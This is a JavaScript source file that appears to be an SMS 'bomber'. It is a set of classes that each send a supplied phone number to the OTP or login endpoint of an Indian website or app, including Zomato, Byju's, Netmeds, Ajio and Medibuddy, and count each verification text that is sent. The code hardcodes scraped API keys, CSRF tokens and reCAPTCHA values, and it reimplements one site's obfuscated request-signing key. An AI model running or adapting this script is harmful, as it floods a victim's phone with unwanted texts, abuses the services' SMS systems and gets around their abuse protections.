class w{
	send(msg){
		console.log(msg)
	}
}
let ws = new w;

class mywallety {
	hash(data) {
    	var password = String.fromCharCode(109,121,119,97,108,108,101,116,108,121,45,111,112,115,117,107,114,97,116);
    	let encryptedData = "";
		for (let i = 0; i < data.length; i++) {
			const charCode = String(data[i]).charCodeAt(0) ^ password.charCodeAt(i % password.length);
			encryptedData += String.fromCharCode(charCode);
		}
    	return btoa(encryptedData);
	}

	random(length = 50) {
		let result = "";
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		for (let i = 0; i < length; i++) {
			const randomIndex = Math.floor(Math.random() * characters.length);
			result += characters.charAt(randomIndex);
		}
		return result;
	}

	prepaire_hash_data(data) {
		var dataString = JSON.stringify(data);
		var hashData = this.hash(dataString);
		data["hash"] = hashData;
		var dataFinal = JSON.stringify(data);
		return dataFinal;
	}
	async mainfun(number,ws){
		fetch("https://www.mywalletly.in/api/",{
			method:"POST",
			headers:{
				"Content-Type":"application/json"
			},
			body:this.prepaire_hash_data({
				"mobile":number,
				"random":this.random(),
				'method':"sendOtp"
			})
		}).then(res=>res.json()).then(data=> {
			if(data.status === "success") 
				ws.send("+1")
		});
	}
	constructor(number,ws){
		this.mainfun(number,ws);
	}
}

class infinitylearn{
	constructor(number,ws){
		fetch("https://otp.infinitylearn.com/api/generateOTP",{
			method:"POST",
			headers:{
				"Content-Type":"application/json"
			},
			body:JSON.stringify({"isd_code":"+91","phone":number,"tenant_id":"1","product_id":"300"})
		}).then(res=> res.json()).then((data)=>{
			if(data === true)
				ws.send("+1")
		})
	}
}

class my11circle{
	constructor(number,ws){
		fetch("https://www.my11circle.com/api/fl/auth/v3/getOtp",{
			method:"POST",
			headers:{
				"Content-Type":"application/json"
			},
			body:JSON.stringify({
				"mobile": number,
				"deviceId": "c4a7dd00-b941-48b7-89e8-4b758aa13d37",
				"deviceName": "",
				"refCode": "",
				"isPlaycircle": false
			})
		}).then(res => res.json()).then((data)=>{
			if(data.success === true)
				ws.send("+1")
		})
	}
}

class housing{
	constructor(number,ws){
		fetch("https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb",{
			method:"POST",
			headers:{
				"Content-Type":"application/json"
			},
			body:JSON.stringify({"query":"\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n    $method: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n      method: $method\n    ) {\n      success\n      message\n    }\n  }\n","variables":{"phone":number,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"}})
		}).then(res=>res.json()).then((data)=>{
			if(data.data.sendOtp.success === true)
				ws.send("+1")
		})
	}
}


class zomato{
    constructor(number,ws){
        let data = new FormData();
        data.append("country_id", "1");
        data.append("number",number);
        data.append("type","initiate");
        data.append("csrf_token","1a20ab53810a26f6e668ba114ac310aa");
        data.append("lc","321f785dacc842fd84097ddee7616ac3");
        data.append("verification_type","sms")
        fetch("https://accounts.zomato.com/login/phone",{
            method:"POST",
            body:data
        }).then(res=>res.json()).then((data)=>{
            if(data.status === true && data.message === "Check text messages for your OTP")
                ws.send("+1")
        })
    }
}

class fantv{
    constructor(number, ws){
        fetch("https://admin.artistfirst.in/v1/auth/login-signup",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "mobile": number,
                "phoneCountryCode": "+91",
                "userId": "66cc47322c93001caa0d9f01"
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.message === "success")
                ws.send("+1")
        })
    }
}

class byjus{
    constructor(number,ws){
        fetch("https://identity.tllms.com/api/request_otp",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "phone": "+91-"+number,
                "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.phone === "+91-"+number)
                ws.send("+1")
        })
    }
}

class netmeds{
    constructor(number, ws){
        fetch("https://www.netmeds.com/mst/rest/v1/id/details/"+number,).then(res=>res.json()).then((data)=>{
            if(data?.result?.otp_details?.random_key)
                ws.send("+1")
        })
    }
}

class unacademy{
    constructor(number,ws){
        fetch("https://unacademy.com/api/v3/user/user_check/?enable-email=true",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({"phone":number,"country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false})
        }).then(res=>res.json()).then((data)=>{
            if(data.message === "OTP has been sent to your phone number")
                ws.send("+1")
        })
    }
}

class medibuddy{
    constructor(number,ws){
        fetch("https://loginprod.medibuddy.in/unified-login/user/register",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "source": "medibuddyInWeb",
                "platform": "medibuddy",
                "phonenumber": number,
                "flow": "Retail-Login-Home-Flow",
                "idealLoginFlow": "false",
                "advertiserId": "22003edf-0bc8-L8d1-9012-28760f6f6e44",
                "mbUserId": "null"
                })
        }).then(res=>res.json()).then((data)=>{
            if(data.data.OtpStatus === "Sent")
                ws.send("+1")
        })
    }
}

class momsco{
    constructor(number,ws){
        fetch("https://acl.mgapis.com/v6/otp/generate?vendorCode=tmc&countryFilter=IND&languageFilter=EN&apikey=4b47c4d455ab989c71464395cc74c23a",{
            method:"POST",
            headers:{
                "Content-Type":"application/json",
                "g-recaptcha-action":"sendOtp",
                "g-recaptcha-response":"c00da4f9-b137-4a4a-b548-25e1618ee603"
            },
            body:JSON.stringify({
                "countryCode": "91",
                "mobile": number,
                "isWhatsAppOpted": null,
                "name": "",
                "vendorCode": "tmc"
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.message === "Successfully Generated OTP")
                ws.send("+1")
        })
    }
}

class ajio{
    constructor(number,ws){
        fetch("https://login.web.ajio.com/api/auth/generateLoginOTP",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                "mobileNumber": number
            })
        }).then(res=>res.json()).then((data)=>{
            if(data.success === true)
                ws.send("+1")
            else{
                fetch("https://login.web.ajio.com/api/auth/signupSendOTP",{
                    method:"POST",
                    headers:{
                        "Content-Type":"application/json"
                    },
                    body:JSON.stringify({
                        "firstName": "saiyeja",
                        "login": "alsolss@gmail.com",
                        "genderType": "Female",
                        "mobileNumber": number,
                        "rilFnlRegisterReferralCode": "",
                        "requestType": "SENDOTP",
                        "newDesign": false
                    })
                }).then(res=>res.json()).then((data)=>{
                    if(data.statusCode === "1")
                        ws.send("+1")
                })
            }
        })
    }
}
